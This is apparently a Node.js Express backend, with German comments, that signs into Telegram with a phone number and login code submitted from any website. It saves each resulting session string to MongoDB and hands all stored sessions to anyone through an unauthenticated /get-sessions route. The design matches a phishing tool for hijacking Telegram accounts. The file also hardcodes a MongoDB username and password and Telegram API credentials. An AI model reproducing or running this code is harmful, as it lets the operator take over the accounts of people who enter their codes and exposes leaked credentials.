const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Sessions speichern: { phoneNumber: { client, phoneCodeHash } }
const activeClients = new Map();

app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'] }));
app.use(express.json());

// MongoDB
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
mongoose.connect(MONGO_URI).catch(err => console.error(err));

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const SessionModel = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

app.post('/send-code', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        
        // Speichere Client und Hash global für diese Nummer
        activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

app.post('/verify-code', async (req, res) => {
    try {
        const { phone, code } = req.body;
        const sessionData = activeClients.get(phone);

        if (!sessionData) {
            return res.status(400).json({ error: "Keine aktive Sitzung gefunden. Bitte Nummer neu eingeben." });
        }

        const { client, phoneCodeHash } = sessionData;

        await client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        const stringSession = client.session.save();
        await SessionModel.create({ phone, session: stringSession });
        
        // Cleanup
        activeClients.delete(phone);
        
        res.json({ success: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
});

app.get('/get-sessions', async (req, res) => {
    const sessions = await SessionModel.find();
    res.json(sessions);
});

app.listen(PORT, () => console.log(`Server gestartet`));
